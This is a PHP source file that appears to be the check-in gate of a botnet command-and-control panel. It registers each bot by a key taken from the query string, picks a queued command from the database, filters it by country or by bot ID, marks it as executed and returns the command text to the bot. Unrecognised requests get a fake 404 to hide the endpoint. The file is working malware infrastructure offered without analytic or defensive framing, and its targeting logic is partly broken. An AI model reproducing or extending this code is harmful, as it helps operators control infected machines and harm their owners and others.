<?
include_once('stat.php');
include_once('modules/bot.php');
include_once('modules/config/config.php');
include_once('modules/security.php');

date_default_timezone_set("Europe/Moscow");
$sec = new Security('activation');
$stat = new Stats('activation');
$key = array();

if(isset($_GET['key'])):

	$k = $_SERVER['QUERY_STRING'];
	$k = str_replace('key=', '', $k);
	$user = new Bot($k);
	$cmdarr = array();
	
		if($user->result == true):
		
			$user->AddUser();
			$idbot = $user->GetBotID();
			$cmdarr = $user->SelectAllCommand($idbot);
			$curr_country = $user->countrycode;
		
			if(count($cmdarr)>0):	
		
				$key = array_rand($cmdarr, 1);
				
				$cmdid = intval($cmdarr[$key]['id']);
				$amount = intval($cmdarr[$key]['amount']);
				$forid = intval($cmdarr[$key]['forid']);
				$forcountry = htmlspecialchars_decode($cmdarr[$key]['country'], ENT_COMPAT);
				$cmdtext = htmlspecialchars_decode($cmdarr[$key]['cmd'], ENT_COMPAT);
				$isMarkered = $user->isMarked($idbot, $cmdid);
				
				$country = false;
				$target_bot = false;
				$not_found = false;
				
				if($forid !== 0) $target_bot = true;
				if(strlen($forcountry) !== 0) $country = true;
				
				
					if($isMarkered == false):
					
						if (((strtolower($curr_country) == strtolower($forcountry))) && ($country == true)):
							$user->DoneUp($cmdid);
							$user->MarkSet($idbot, $cmdid);
							var_dump($cmdtext);	
							$ns = true;
						else: $ns = false; endif;
						
						if ($forid == $idbot):
							$user->DoneUp($cmdid);			
							$user->MarkSet($idbot, $cmdid);				
							var_dump($cmdtext);	
							$va = true;
						else: $ns = false; endif;
						
						if ($ns == false):
							$user->DoneUp($cmdid);
							$user->MarkSet($idbot, $cmdid);
							var_dump($cmdtext);	
							$ns = true;
						else: $ns = false; endif;
						
					else:
						header('HTTP/1.1 404 Not Found');
						exit;
					endif;
					
				else: $sec->NotFound(); endif;
		else: $sec->NotFound(); endif;
else: $sec->NotFound(); endif;

	


?>